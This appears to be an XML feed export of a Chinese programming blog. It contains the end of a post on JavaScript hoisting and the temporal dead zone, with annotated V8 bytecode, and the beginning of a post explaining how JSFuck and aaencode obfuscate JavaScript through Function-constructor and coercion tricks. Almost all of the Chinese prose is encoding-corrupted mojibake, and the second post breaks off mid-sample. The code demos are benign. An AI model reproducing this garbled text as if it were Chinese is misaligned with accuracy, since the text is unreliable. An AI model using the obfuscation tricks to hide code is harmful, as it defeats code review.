let èˆ‡ const ä¹Ÿæœ‰ hoisting ä½†æ²’æœ‰åˆå§‹åŒ–ç‚º undefinedï¼Œè€Œä¸”åœ¨è³¦å€¼ä¹‹å‰è©¦åœ–å–å€¼æœƒç™¼ç”ŸéŒ¯èª¤ã€‚

Byte code é–±è®€åˆé«”é©—ä¸Šé¢æ—¢ç„¶è«‡åˆ°äº† JS å¼•æ“ï¼Œå¦‚æœæ²’æœ‰è«‡åˆ° V8 é‚£å°±æœ‰é»å¯æƒœï¼Œåœ¨æˆ‘ç ”ç©¶ hoisting çš„æ™‚å€™æˆ‘ä¸€ç›´å¾ˆæƒ³çŸ¥é“ä¸€ä»¶äº‹æƒ…ï¼šV8 ç·¨è­¯å‡ºä¾†çš„ç¨‹å¼ç¢¼åˆ°åº•é•·æ€æ¨£ï¼Ÿ
æ„Ÿè¬ Understanding V8â€™s Bytecode é€™ä¸€ç¯‡ç²¾å½©çš„æ–‡ç« ï¼Œå¯ä»¥è®“æˆ‘å€‘è©¦è‘—ç”¨ node.js æŠŠç¨‹å¼ç¢¼ç·¨è­¯æˆ byte code ä¸¦ä¸”è©¦åœ–è§£è®€ã€‚
åœ¨çœ‹ä¹‹å‰å…ˆä¾†ä»‹ç´¹ä»€éº¼æ˜¯ byte codeï¼Œå®ƒå°±æ˜¯ä¸€ç¨®ä»‹æ–¼é«˜éšèªè¨€èˆ‡æ©Ÿå™¨ç¢¼ä¸­é–“çš„èªè¨€ï¼Œæ²’æœ‰é«˜éšèªè¨€å¥½æ‡‚å¯æ˜¯å»æ¯”æ©Ÿå™¨ç¢¼å¥½æ‡‚è¨±å¤šï¼Œè€ŒåŸ·è¡Œèµ·ä¾†çš„æ•ˆç‡ä¹Ÿæ¯”è¼ƒé«˜ã€‚
ä¸‹é¢é€™å¼µåœ–å°±æ˜¯æ–‡ç« è£¡é¢é™„çš„ï¼Œå¾ˆæ¸…æ¥šåœ°è§£é‡‹äº†ä¹‹é–“çš„é—œä¿‚ï¼š

æ¥è‘—æˆ‘å€‘ç”¨é€™ä¸€å€‹ç°¡å–®çš„ function ç•¶ä½œç¯„ä¾‹ï¼Œä¾†çœ‹ç·¨è­¯éå¾Œæœƒé•·æ€æ¨£ï¼š
function funcA() &#123;    var a = 10    console.log(a)&#125;funcA()

é›–ç„¶åªæœ‰ä¸€å€‹ functionï¼Œä½†æ˜¯ç”¨ node.js è·‘é‚„æ˜¯æœƒå‡ºç¾ä¸€å¤§å †æ±è¥¿ï¼Œæ‰€ä»¥æˆ‘å€‘æŠŠçµæœå…ˆæ”¾åˆ°æª”æ¡ˆè£¡é¢ï¼šnode --print-bytecode test.js &gt; byte_code.txt
ç·¨è­¯å‡ºä¾†çš„çµæœé•·é€™æ¨£ï¼š
[generating bytecode for function: funcA]Parameter count 1Frame size 24   76 E&gt; 0xeefa4feb062 @    0 : 91                StackCheck    93 S&gt; 0xeefa4feb063 @    1 : 03 0a             LdaSmi [10]         0xeefa4feb065 @    3 : 1e fb             Star r0  100 S&gt; 0xeefa4feb067 @    5 : 0a 00 02          LdaGlobal [0], [2]         0xeefa4feb06a @    8 : 1e f9             Star r2  108 E&gt; 0xeefa4feb06c @   10 : 20 f9 01 04       LdaNamedProperty r2, [1], [4]         0xeefa4feb070 @   14 : 1e fa             Star r1  108 E&gt; 0xeefa4feb072 @   16 : 4c fa f9 fb 00    CallProperty1 r1, r2, r0, [0]         0xeefa4feb077 @   21 : 04                LdaUndefined   115 S&gt; 0xeefa4feb078 @   22 : 95                Return Constant pool (size = 2)Handler Table (size = 16)

æˆ‘å€‘æŠŠå‰é¢ä¸€äº›è³‡è¨Šæ¸…ç©ºä¸¦åŠ ä¸Šè¨»è§£ï¼Œå¥½è®“å¤§å®¶çŸ¥é“ä¸Šé¢ç¨‹å¼ç¢¼æ˜¯ä»€éº¼æ„æ€ï¼ˆæˆ‘å…¶å¯¦ä¹Ÿæ²’æœ‰çœŸçš„å¾ˆæ‡‚ï¼Œé€™æ–¹é¢è³‡æ–™å¥½åƒæ»¿å°‘çš„ï¼Œå¦‚æœæœ‰éŒ¯è«‹ç³¾æ­£ï¼‰ï¼š
StackCheck LdaSmi [10]                    // æŠŠ 10 æ”¾åˆ° accumulator è£¡é¢Star r0                        // æŠŠ accumulator çš„å€¼æ”¾åˆ° r0 è£¡ï¼Œæ‰€ä»¥ r0 = 10LdaGlobal [0], [2]             // è¼‰å…¥ä¸€å€‹ Global çš„æ±è¥¿åˆ° acc è£¡Star r2                        // æŠŠå®ƒå­˜åˆ° r2ï¼Œæ ¹æ“šå¾Œè¦‹ä¹‹æ˜ï¼Œr2 æ‡‰è©²å°±æ˜¯ consoleLdaNamedProperty r2, [1], [4]  // è¼‰å…¥ä¸€å€‹ r2 çš„ Propertyï¼ˆæ‡‰è©²å°±æ˜¯ logï¼‰Star r1                        // æŠŠå®ƒå­˜åˆ° r1ï¼Œä¹Ÿå°±æ˜¯ r1 = console.logCallProperty1 r1, r2, r0, [0]  // console.log.call(console, 10)LdaUndefined                   // æŠŠ undefined æ”¾åˆ° accReturn                         // return undefined

å†ä¾†æˆ‘å€‘æŠŠé †åºé¡›å€’ï¼Œè®Šæˆé€™æ¨£ï¼š
function funcA() &#123;    console.log(a)    var a = 10&#125;funcA()

ä¾†çœ‹çœ‹è¼¸å‡ºçš„ byte code æœƒè®Šä»€éº¼æ¨£å­ï¼Œçœ‹è§£é‡‹ä¹‹å‰ä½ å¯ä»¥å…ˆå°ç…§ä¸€ä¸‹ä¸Šé¢çš„ï¼Œçœ‹çœ‹å·®åˆ¥åœ¨å“ªï¼š
StackCheckLdaGlobal [0], [2]             // è¼‰å…¥ä¸€å€‹ Global çš„æ±è¥¿åˆ° acc è£¡Star r2                        // æŠŠå®ƒå­˜åˆ° r2ï¼Œæ ¹æ“šå¾Œè¦‹ä¹‹æ˜ï¼Œr2 æ‡‰è©²å°±æ˜¯ consoleLdaNamedProperty r2, [1], [4]  // è¼‰å…¥ä¸€å€‹ r2 çš„ Propertyï¼ˆæ‡‰è©²å°±æ˜¯ logï¼‰Star r1                        // æŠŠå®ƒå­˜åˆ° r1ï¼Œä¹Ÿå°±æ˜¯ r1 = console.logCallProperty1 r1, r2, r0, [0]  // console.log.call(console, undefined)LdaSmi [10]                    // æŠŠ 10 æ”¾åˆ° accumulator è£¡é¢Star r0                        // æŠŠ accumulator çš„å€¼æ”¾åˆ° r0 è£¡ï¼Œæ‰€ä»¥ r0 = 10LdaUndefined                   // æŠŠ undefined æ”¾åˆ° accReturn                         // return undefined 

å…¶å¯¦åªæ˜¯é †åºèª¿æ›äº†ä¸€ä¸‹ï¼Œåœ¨è¼¸å‡ºçš„åœ°æ–¹ç›´æ¥ log äº† r0ï¼Œé€™é‚Šæˆ‘ä¸ç¢ºå®šçš„æ˜¯ r0 åŸæœ¬å°±æ˜¯ undefinedï¼Œé‚„æ˜¯åœ¨å…¶ä»–åœ°æ–¹è¢«åˆå§‹åŒ–æˆ undefinedã€‚
å†ä¾†æˆ‘å€‘çœ‹çœ‹å¦‚æœè©¦åœ–å°å‡ºä¸€å€‹æœªå®£å‘Šçš„è®Šæ•¸æœƒç™¼ç”Ÿä»€éº¼äº‹ï¼š
function funcA() &#123;    console.log(b)    var a = 10&#125;funcA()

å› ç‚ºå¤§éƒ¨åˆ†ç¨‹å¼ç¢¼éƒ½è·Ÿå‰é¢é‡è¤‡æˆ‘å°±ä¸å†è¨»è§£äº†ï¼š
StackCheck LdaGlobal [0], [2]Star r2LdaNamedProperty r2, [1], [4]Star r1LdaGlobal [2], [6]  // è©¦åœ–è¼‰å…¥ b çš„å€¼ï¼Œå‡ºéŒ¯Star r3CallProperty1 r1, r2, r3, [0]LdaSmi [10]Star r0LdaUndefined Return     

æ•´æ®µçš„é‡é»åªæœ‰LdaGlobalé‚£è¡Œï¼Œçœ‹èµ·ä¾†æ‡‰è©²æ˜¯å»è¼‰å…¥ b çš„å€¼ï¼Œåœ¨åŸ·è¡Œçš„æ™‚å€™æ‡‰è©²ä¹Ÿå°±æ˜¯é€™è¡Œå‡ºéŒ¯ï¼Œå› ç‚ºåœ¨ global è£¡é¢æ‰¾ä¸åˆ° bã€‚
çœ‹å®Œäº†åŸºæœ¬çš„ä¹‹å¾Œï¼Œæˆ‘å€‘ä¾†çœ‹çœ‹ let æœƒç·¨è­¯æˆä»€éº¼æ¨£å­ï¼š
function funcA() &#123;    console.log(a)    let a = 10&#125;funcA()

ç·¨è­¯å¾Œçš„çµæœï¼š
LdaTheHole                    // æŠŠ hole è¼‰å…¥åˆ° acc å»Star r0                       // r0 = holeStackCheck LdaGlobal [0], [2]            Star r2                       // r2 = consoleLdaNamedProperty r2, [1], [4]Star r1                       // r1 = console.logLdar r0                       // è¼‰å…¥ r0ThrowReferenceErrorIfHole [2] // æ‹‹å‡ºéŒ¯èª¤CallProperty1 r1, r2, r0, [0] // console.log.call(console, r0)LdaSmi [10]Star r0LdaUndefined Return

ä½ æœƒçœ‹åˆ°å¤šäº†ä¸€å€‹ç¥ç§˜çš„æ±è¥¿å«åš holeï¼Œé€™å€‹å…¶å¯¦å°±æ˜¯æˆ‘å€‘æ‰€èªªçš„ TDZï¼Œæ‰€ä»¥æ‰æœƒæœ‰ ThrowReferenceErrorIfHole é‚£ä¸€è¡Œï¼Œå°±ä»£è¡¨èªªåœ¨ TDZ çµæŸä¹‹å‰æˆ‘å€‘å¦‚æœè©¦åœ–å»å­˜å–é€™å€‹ hole çš„å€¼éƒ½æœƒæ‹‹å‡ºéŒ¯èª¤ã€‚
è‡³æ­¤ï¼Œä¹Ÿè§£é‡‹äº† TDZ å¯¦éš›ä¸Šåœ¨ç·¨è­¯éšæ®µæ˜¯å¦‚ä½•é‹ä½œçš„ï¼Œå°±æ˜¯é€é hole é€™å€‹ç‰¹åˆ¥çš„æ±è¥¿ã€‚
ç¸½çµæœ€è¿‘é–‹å§‹è£œé½Šè‡ªå·±å° JavaScript çš„ä¸€äº›åŸºç¤çŸ¥è­˜ï¼Œä¸è£œé‚„å¥½ï¼Œä¸€è£œä¸‹å»ç™¼ç¾è‡ªå·±æ‡‚çš„æ±è¥¿æ¯”è‡ªå·±æƒ³åƒä¸­é‚„å°‘ï¼Œæˆ‘è¦å…ˆæ„Ÿè¬å…©ç¯‡æ–‡ç« ï¼šè§£è¯»ECMAScript[1]â€”â€”æ‰§è¡Œç¯å¢ƒã€ä½œç”¨åŸŸåŠé—­åŒ…ã€JS ä½œç”¨åŸŸï¼Œé€™å…©ç¯‡æ˜¯æˆ‘çš„å•Ÿè’™å°å¸«ï¼Œå¦‚æœæ²’çœ‹åˆ°é€™å…©ç¯‡ï¼Œå¤§æ¦‚ä¹Ÿä¸æœƒæœ‰é€™ç¯‡æ–‡ç« çš„å‡ºç¾ã€‚
JavaScript å¸¸è€ƒçš„å¹¾å€‹é»å¤§å®¶éƒ½è€³ç†Ÿèƒ½è©³ï¼šthisã€prototypeã€clousre è·Ÿ hoistingï¼Œè€Œé€™å¹¾å€‹çœ‹ä¼¼ä¸ç›¸é—œçš„æ±è¥¿ï¼Œå…¶å¯¦åªè¦ä½ èƒ½ç†è§£ JavaScript èƒŒå¾Œçš„é‹ä½œæ¨¡å‹ï¼Œéƒ½èƒ½å¤ å¤šå°‘ä¸²å¾—èµ·ä¾†ï¼Œæˆç‚ºä¸€å€‹å®Œæ•´çš„ç†è«–ã€‚
æˆ‘åœ¨æ–‡ä¸­ä¹Ÿæœ‰æåˆ°ï¼Œä¸Šé¢è¬›è¿°åŸ·è¡Œç’°å¢ƒçš„é‚£æ®µéç¨‹ï¼Œå…¶å¯¦è£œå……å¾—æ›´å®Œæ•´ä»¥å¾Œå°±å¯ä»¥æ‹¿ä¾†è§£é‡‹ clousreï¼Œå°±æœƒç™¼ç¾å¾ˆå¤šæ±è¥¿å…¶å¯¦éƒ½èƒ½èæœƒè²«é€šã€‚æ—¥å¾Œæœ‰æ©Ÿæœƒå¯ä»¥æŠŠé€™æ•´å¥—è®Šæˆä¸€ç³»åˆ—ï¼Œä¸€ä¸€æ“Šç ´ JavaScript é‚£äº›ä½ ä»¥ç‚ºå¾ˆé›£ä½†å…¶å¯¦æ²’æœ‰çš„æ¦‚å¿µã€‚
å¯«é€™ç¯‡ä»¥å‰æˆ‘å¤§æ¦‚é†é‡€äº†ä¸€å€‹æœˆï¼Œä¸æ–·æ‰¾è³‡æ–™ä»¥å¾Œæ¶ˆåŒ–ä¸¦ä¸”è½‰åŒ–ç‚ºè‡ªå·±çš„ç†è§£ï¼Œä¹Ÿå¾ˆæ„Ÿè¬ä¸Šé¢é‚£ç¯‡ JS ä½œç”¨åŸŸçš„ä½œè€…ä»¥åŠ YDKJS çš„ä½œè€…è€å¿ƒè§£æƒ‘ã€‚
æœ€å¾Œï¼Œä¹Ÿå¸Œæœ›é€™ç¯‡æ–‡ç« å°ä½ å€‘æœ‰å¹«åŠ©ï¼Œæœ‰ä»»ä½•éŒ¯èª¤éƒ½å¯ä»¥è·Ÿæˆ‘åæ˜ ï¼Œæ„Ÿè¬ã€‚
åƒè€ƒè³‡æ–™ï¼š

MDN: Hoisting
ECMA-262-3 in detail. Chapter 2. Variable object.
JS ä½œç”¨åŸŸ
JavaScript Optimization Patterns (Part 2)
danbev&#x2F;learning-v8
Why is there a â€œtemporal dead zoneâ€ in ES6?
exploringjs: Variables and scoping #
ES6 ä¸­çš„ TDZï¼ˆtemporal dead zoneï¼‰åŠå‡½æ•°ä½œç”¨åŸŸ
ç”±é˜®ä¸€å³°è€å¸ˆçš„ä¸€æ¡å¾®åšå¼•å‘çš„ TDZ æ€è€ƒ
ç†è§£ES6ä¸­çš„æš‚æ—¶æ­»åŒº(TDZ)
TEMPORAL DEAD ZONE (TDZ) DEMYSTIFIED
MDN: let
Grokking V8 closures for fun (and profit?)
è§£è¯»ECMAScript[1]â€”â€”æ‰§è¡Œç¯å¢ƒã€ä½œç”¨åŸŸåŠé—­åŒ…

é—œæ–¼ä½œè€…ï¼š@huli é‡ç”Ÿå·¥ç¨‹å¸«ï¼Œç›¸ä¿¡åˆ†äº«èˆ‡äº¤æµèƒ½è®“ä¸–ç•Œè®Šå¾—æ›´ç¾å¥½
]]></content>
      <tags>
        <tag>javascript</tag>
        <tag>hoisting</tag>
      </tags>
  </entry>
  <entry>
    <title>è®“ JavaSript é›£ä»¥é–±è®€ï¼šjsfuck èˆ‡ aaencode</title>
    <url>/2016/07/16/javascript-jsfuck-and-aaencode/</url>
    <content><![CDATA[å‰è¨€åœ¨é€²å…¥ä»Šå¤©çš„ä¸»é¡Œä¹‹å‰ï¼Œå…ˆæ¨è–¦å¤§å®¶çœ‹ä¸€å€‹å½±ç‰‡ WATï¼šA lightning talk by Gary Bernhardt from CodeMash 2012ã€‚åœ¨é€™å€‹å½±ç‰‡è£¡é¢ï¼Œè¬›è€…æœƒç‚ºå¤§å®¶ç¤ºç¯„ JavaScript åˆ°åº•æœ‰å¤šã€Œç¥å¥‡ã€ã€‚è€Œé€™äº›ç¥å¥‡çš„ç‰¹æ€§ï¼Œä¹Ÿæœƒè·Ÿæˆ‘å€‘ä¹‹å¾Œæ‰€è¦ä»‹ç´¹çš„å…©å€‹æ±è¥¿æœ‰é—œã€‚
å…ˆå¾ Brainfuck é–‹å§‹å¤§å®¶æœ‰è½é Brainfuck å—ï¼Ÿé¡§åæ€ç¾©ï¼Œå°±æ˜¯æœƒè®“ä½ è¶…ç´šé ­ç—›çš„ä¸€å€‹ç¨‹å¼èªè¨€ï¼Œåªç”¨ä¸‹é¢é€™å…«å€‹å­—å…ƒå°±å¯ä»¥å¯«å‡ºä¸€å€‹å®Œæ•´çš„ç¨‹å¼ï¼š




&lt;








.
,
[
]

è€Œé€™å¹¾ç¨®å­—å…ƒå¦‚æœå°æ‡‰åˆ° C çš„ç¨‹å¼ç¢¼ï¼Œå°±æ˜¯ï¼š

++ptr;
â€“ptr;
++*ptr;
â€“*ptr;
putchar(*ptr);
*ptr &#x3D;getchar();
while (*ptr) {
}

ï¼ˆè³‡æ–™ä¾†æºï¼šwikipedia: Brainfuckï¼‰Brainfuck å…§å»ºæœƒçµ¦ä½ ä¸€çµ„é™£åˆ—ï¼Œä¸¦ä¸”è®“ ptr æŒ‡å‘é™£åˆ—é–‹é ­ï¼Œå‰©ä¸‹çš„äº‹æƒ…å°±äº¤çµ¦æˆ‘å€‘è‡ªå·±äº†ï¼Œèˆ‰ä¾‹ä¾†èªªï¼Œè¼¸å‡º Hello World çš„ç¨‹å¼é•·é€™æ¨£ï¼š
++++++++++[&gt;+++++++&gt;++++++++++&gt;+++&gt;+&lt;&lt;&lt;&lt;-]&gt;++.&gt;+.+++++++..+++.&gt;++.&lt;&lt;+++++++++++++++.&gt;.+++.------.--------.&gt;+.&gt;.

å¦‚æœæƒ³çœ‹æ›´å¤šç¯„ä¾‹å¯ä»¥åƒè€ƒç¶­åŸºç™¾ç§‘ï¼Œä¸Šé¢æœ‰é™„ä¸€äº›èªªæ˜ã€‚ç”±æ–¼ Brainfuck ä¸¦ä¸æ˜¯ä»Šå¤©çš„é‡é»ï¼Œå› æ­¤åªæ˜¯ç¨å¾®è·Ÿå¤§å®¶ä»‹ç´¹ä¸€ä¸‹è€Œå·²ã€‚
JSfuckæ¥è‘—å°±æ˜¯æˆ‘å€‘ä»Šå¤©çš„ç¬¬ä¸€å€‹ä¸»è§’ï¼šJSfuckï¼Œæˆ‘å€‘å…ˆä¾†çœ‹ä¸€æ®µ JSfuck çš„ç¨‹å¼ç¢¼ï¼š

ç¾åœ¨ä½ çŸ¥é“å®ƒç‚ºä»€éº¼å–åšé€™å€‹åç¨±äº†å§ï¼èˆ‡ Brainfuck ç›¸ä¼¼ï¼ŒJSfuck åªæœ‰å…­å€‹å­—å…ƒï¼š

[
]
(
)
!





å¯æ˜¯ JSfuck èˆ‡ Brainfuck æœ€å¤§çš„å·®åˆ¥å°±åœ¨æ–¼ï¼ŒJSfuck å…¶å¯¦æ˜¯æŠŠä½ çš„ JavaScript ç¨‹å¼ç¢¼è½‰æ›æˆé€™æ¨£çš„å½¢å¼ï¼Œè€Œä¸æ˜¯åƒ Brainfuck é‚£æ¨£ï¼Œæ¯ä¸€å€‹ç¬¦è™Ÿéƒ½æœ‰è‡ªå·±ä»£è¡¨çš„å‹•ä½œã€‚æ¥è‘—å°±è®“æˆ‘å€‘ä¾†çœ‹çœ‹ JSfuck çš„åŸç†åˆ°åº•æ˜¯ä»€éº¼å§ï¼  
Function Constructorå¦‚æœæƒ³è¦åŸ·è¡Œä¸€æ®µå­—ä¸²è£¡é¢çš„ç¨‹å¼ç¢¼ï¼Œå¯ä»¥æ€éº¼åšå‘¢ï¼Ÿä½ å¯èƒ½æœƒç”¨ evalï¼Œä½†å…¶å¯¦é‚„æœ‰ä¸€å€‹æ–¹æ³•ï¼Œå°±æ˜¯ Function Constructorï¼Œä½ å¯ä»¥å‚³å…¥ä¸€æ®µå­—ä¸²ï¼Œé‚£æ®µå­—ä¸²å°±æœƒè¢«ç•¶åšç¨‹å¼ç¢¼ä¾†é‹è¡Œï¼Œèˆ‰ä¾‹ä¾†èªªï¼š
new Function(&#x27;alert(1)&#x27;)();

ä¸Šé¢é€™æ®µç¨‹å¼ç¢¼å°±æœƒåšè·Ÿ alert(1) ä¸€æ¨£çš„äº‹æƒ…ä¸åªå¦‚æ­¤ï¼Œå…¶å¯¦é€£åƒæ•¸åç¨±éƒ½å¯ä»¥å‚³å…¥ï¼
new Function(&#x27;a&#x27;, &#x27;b&#x27;, &#x27;return a+b;&#x27;)(1, 2);// 3

é€™ä¸€æ®µå…ˆåˆ°é€™é‚Šæš«æ™‚æ‰“ä½ï¼Œç­‰ç­‰å†å›ä¾†çœ‹ã€‚ä½†æ˜¯ç¾åœ¨çŸ¥é“ä¸€å€‹å¾ˆé‡è¦çš„äº‹å¯¦äº†ï¼šåªè¦ä½ æœ‰ä¸€æ®µæ–‡å­—ï¼Œå°±å¯ä»¥ç”¨ Function Constructor çš„æ–¹å¼å»åŸ·è¡Œã€‚
å¦‚ä½•æ¹Šå‡ºç¨‹å¼ç¢¼ï¼Ÿé‚£æˆ‘å€‘ä¸‹ä¸€å€‹è¦é”æˆçš„ç›®æ¨™å°±æ˜¯ï¼Œæ¹Šå‡ºæ‰€æœ‰çš„æ–‡å­—ï¼Œä¸¦ä¸”éƒ½æ˜¯ç”¨é‚£å…­å€‹å­—å…ƒçµ„æˆï¼Œä¸å°±å¯ä»¥åŸ·è¡Œäº†å—ï¼Ÿ
å…ˆå¾æ•¸å­—é–‹å§‹å§ï¼Œçœ‹çœ‹æ€æ¨£å¯ä»¥æ¹Šå‡ºæ•¸å­—ã€‚ä½†å…¶å¯¦æˆ‘å€‘ä¹Ÿåªè¦æ¹Šå‡º 0 è·Ÿ 1 å°±å¥½ï¼Œå› ç‚ºå…¶ä»–æ­£æ•´æ•¸éƒ½å¯ä»¥é€éé€™å…©å€‹æ•¸å­—æ‹¼æ¹Šèµ·ä¾†ã€‚  
+[]å¯ä»¥æ¹Šå‡º 0ï¼Œæˆ–è€…ä¹Ÿå¯ä»¥æ›ä¸€å€‹æ€è·¯ï¼Œ![]æœƒæ˜¯ falseï¼Œæ‰€ä»¥+![]ä¹Ÿæœƒæ˜¯ 0ï¼Œæœ‰ 0 ä¹‹å¾Œï¼Œè¦è®Šå‡º 1 å°±ä¸é›£äº†ï¼Œå› ç‚º ![] æ˜¯ falseï¼Œæ‰€ä»¥ !![] å°±æ˜¯ trueã€‚é‚£ +!![] å°±æ˜¯æ•¸å­—çš„ 1ã€‚
æ•¸å­—æœ‰äº†ï¼Œæ¥ä¸‹ä¾†æ˜¯æ–‡å­—è·Ÿç¬¦è™Ÿï¼Œæ–‡å­—çš„è©±ä½ å¯èƒ½æœƒç›´æ¥æƒ³åˆ°ï¼šString.fromCharCodeï¼Œåªè¦èƒ½æ¹Šå‡ºé€™æ®µæ–‡å­—ï¼Œä½ å°±èƒ½æ¹Šå‡ºå…¶ä»–ä»»ä½•æ–‡å­—æˆ–ç¬¦è™Ÿäº†ã€‚  
ä½†æˆ‘å€‘å…ˆä¾†çœ‹çœ‹ä¸€å€‹æ¯”è¼ƒç‰¹åˆ¥çš„æ–¹æ³•ï¼Œä¾‹å¦‚èªª ![] æ˜¯ falseï¼Œç„¶å¾Œ []+[] æ˜¯ç©ºå­—ä¸²ï¼Œæ‰€ä»¥æŠŠå…©å€‹åŠ èµ·ä¾†ï¼Œ![]+[]+[]å°±æœƒæ˜¯å­—ä¸²çš„ &quot;false&quot;ï¼ˆå…¶å¯¦ ![]+[] å°±å¯ä»¥äº†ï¼‰ï¼Œé‚£æˆ‘æ˜¯ä¸æ˜¯å¯ä»¥ç”¨ï¼š&quot;false&quot;[0] å–å¾— f é€™å€‹å­—å…ƒï¼Ÿ  
æŠŠå­—ä¸² &quot;false&quot; ç”¨ä¸Šé¢çš„é‚£ä¸²å–ä»£ï¼Œå°±æœƒè®Šæˆï¼š(![]+[]+[])[0]ï¼Œé‚£ 0 åˆå¯ä»¥ç”¨æˆ‘å€‘ä¸Šé¢å¾—å‡ºçš„+[]å–ä»£ï¼Œå°±è®Šï¼š(![]+[]+[])[+[]]ï¼Œé€™æ¨£ä½ å°±æˆåŠŸç”¨é€™å¹¾å€‹å­—å…ƒæ¹Šå‡º f é€™å€‹å­—äº†ï¼Œé…·å§ï¼
å…¶ä»–çš„æ–‡å­—è·Ÿç¬¦è™Ÿä¹Ÿæ˜¯ç›¸åŒåŸç†ï¼Œä½ å¯ä»¥å¾å„å€‹ JavaScript çš„ç¨‹å¼ç¢¼è£¡é¢æ‰¾åˆ°è¨±å¤šæ–‡å­—çš„è¹¤è·¡ï¼Œä¾‹å¦‚èªª undefinedï¼Œå¦‚æœä½ æƒ³çŸ¥é“æ‰€æœ‰çš„æ–‡å­—æ˜¯æ€éº¼æ¹Šå‡ºä¾†çš„ï¼Œå¯ä»¥åƒè€ƒï¼šJSfuck åŸå§‹ç¢¼ã€‚
æŠŠä¸Šé¢çµåˆèµ·ä¾†ç¾åœ¨æœ‰äº† Function Constructor è·Ÿè¦åŸ·è¡Œçš„æ–‡å­—ï¼Œæ˜¯ä¸æ˜¯å°±å¯ä»¥å®Œæˆæˆ‘å€‘æƒ³åšçš„äº‹äº†ã€‚å¯æ˜¯ new Function() è¦æ€éº¼ç”¨é€™å…­å€‹å­—å…ƒæ¹Šå‡ºä¾†å‘¢ï¼Ÿ  
ä¸€å€‹ç©ºçš„é™£åˆ—[]æœ‰å¾ˆå¤šåŸç”Ÿçš„ JavaScript functionï¼Œåƒæ˜¯ map å¥½äº†ï¼Œ[].map å°±å¯ä»¥å¾—åˆ° map é€™å€‹ functionï¼Œæœ‰äº† function ä¹‹å¾Œï¼Œåªè¦ç”¨ map.function.constructorï¼Œå°±å¯ä»¥æ‹¿åˆ° Function Constructoräº†ï¼ å°±åƒ &quot;&quot;.constructor ä¹Ÿå¯ä»¥æ‹¿åˆ° String Constructor ä¸€æ¨£ã€‚
è€Œä¸”.å¯ä»¥ç”¨[]å–ä»£ï¼Œ[].mapæœƒè®Šæˆ[][&#39;map&#39;]ï¼Œé€™æ¨£çµåˆä¸‹ä¾†ï¼Œå°±è®Šæˆï¼š
[][&#x27;map&#x27;][&#x27;constructor&#x27;][][&#x27;map&#x27;][&#x27;constructor&#x27;](&#x27;alert(1)&#x27;)(); // å¯ä»¥é †åˆ©åŸ·è¡Œ

æ¥è‘—å°±æ˜¯æŠŠ map è·Ÿ constuctor é€™å…©å€‹å­—ç”¨ä¸Šé¢çš„æ–¹æ³•æ¹Šå‡ºä¾†ï¼Œä¸æ˜¯å°±å¯ä»¥äº†å—ï¼Ÿ  
åšåˆ°é€™è£¡ï¼Œç›¸ä¿¡å¤§å®¶æ‡‰è©²æ¯”è¼ƒç­è§£ JSfuck çš„åŸç†äº†ï¼Œå°±æ˜¯ç”¨è¨±å¤šç‰¹åˆ¥çš„æŠ€å·§æ¹Šå‡ºæ–‡å­—ã€æ¹Šå‡º Function Constructor ä¾†åŸ·è¡Œé‚£æ®µæ–‡å­—ã€‚
æ¥è‘—ï¼Œæˆ‘å€‘ä»‹ç´¹ä¸€å€‹åŸç†é¡ä¼¼ï¼Œä½†æ›´å¯æ„›çš„æ±è¥¿ï¼
ç”¨é¡æ–‡å­—å¯«ç¨‹å¼
å¯æ„›å§ï¼å±…ç„¶å¯ä»¥æŠŠ JavaScript è®Šæˆä¸€å †é¡æ–‡å­—ï¼aaencode è·Ÿ JSfuck åˆæœ‰ä¸€é»å°å·®ç•°äº†ï¼Œå› ç‚ºaaencodeå¯ä»¥ç”¨åˆ°çš„å­—å…ƒæ¯”è¼ƒå¤šï¼Œåªæ˜¯é•·å¾—æ¯”è¼ƒå¯æ„›è€Œå·²ï¼Œé‚£æ—¢ç„¶JSfuckå¯ä»¥åšåˆ°ï¼Œaaencodeæ²’ä»€éº¼ç†ç”±åšä¸åˆ°ã€‚
æ¥è‘—è®“æˆ‘å€‘ä»”ç´°çœ‹ä¸€æ®µ aaencode è½‰å‡ºä¾†çš„ç¨‹å¼ç¢¼ï¼šï¼ˆå› ç‚ºæœ‰äº›ç‰¹æ®Šå­—å…ƒçš„é—œä¿‚ï¼Œå¯èƒ½æœƒé¡¯ç¤ºä¸å‡ºä¾†ï¼Œä½†ä¸å½±éŸ¿æ•´é«”çš„é–±è®€ï¼Œçœ‹å€‹æ„Ÿè¦ºå°±å¥½ï¼‰
ï¾ŸÏ‰ï¾Ÿï¾‰= /ï½€ï½Â´ï¼‰ï¾‰ ~â”»â”â”»   //*Â´âˆ‡ï½€*/ [&#x27;_&#x27;]; o=(ï¾Ÿï½°ï¾Ÿ)  =_=3; c=(ï¾ŸÎ˜ï¾Ÿ) =(ï¾Ÿï½°ï¾Ÿ)-(ï¾Ÿï½°ï¾Ÿ); (ï¾ŸĞ”ï¾Ÿ) =(ï¾ŸÎ˜ï¾Ÿ)= (o^_^o)/ (o^_^o);(ï¾ŸĞ”ï¾Ÿ)=&#123;ï¾ŸÎ˜ï¾Ÿ: &#x27;_&#x27; ,ï¾ŸÏ‰ï¾Ÿï¾‰ : ((ï¾ŸÏ‰ï¾Ÿï¾‰==3) +&#x27;_&#x27;) [ï¾ŸÎ˜ï¾Ÿ] ,ï¾Ÿï½°ï¾Ÿï¾‰ :(ï¾ŸÏ‰ï¾Ÿï¾‰+ &#x27;_&#x27;)[o^_^o -(ï¾ŸÎ˜ï¾Ÿ)],ï¾ŸĞ”ï¾Ÿï¾‰:((ï¾Ÿï½°ï¾Ÿ==3) +&#x27;_&#x27;) [ï¾Ÿï½°ï¾Ÿ] &#125;; (ï¾ŸĞ”ï¾Ÿ) [ï¾ŸÎ˜ï¾Ÿ] =((ï¾ŸÏ‰ï¾Ÿï¾‰==3) +&#x27;_&#x27;) [c^_^o];(ï¾ŸĞ”ï¾Ÿ) [&#x27;c&#x27;] = ((ï¾ŸĞ”ï¾Ÿ) +&#x27;_&#x27;) [ (ï¾Ÿï½°ï¾Ÿ)+(ï¾Ÿï½°ï¾Ÿ)-(ï¾ŸÎ˜ï¾Ÿ) ];(ï¾ŸĞ”ï¾Ÿ) [&#x27;o&#x27;] = ((ï¾ŸĞ”ï¾Ÿ)+&#x27;_&#x27;) [ï¾ŸÎ˜ï¾Ÿ];(ï¾Ÿoï¾Ÿ)=(ï¾ŸĞ”ï¾Ÿ)  [&#x27;c&#x27;]+(ï¾ŸĞ”ï¾Ÿ) [&#x27;o&#x27;]+(ï¾ŸÏ‰ï¾Ÿï¾‰ +&#x27;_&#x27;)[ï¾ŸÎ˜ï¾Ÿ]+ ((ï¾ŸÏ‰ï¾Ÿï¾‰==3) +&#x27;_&#x27;) 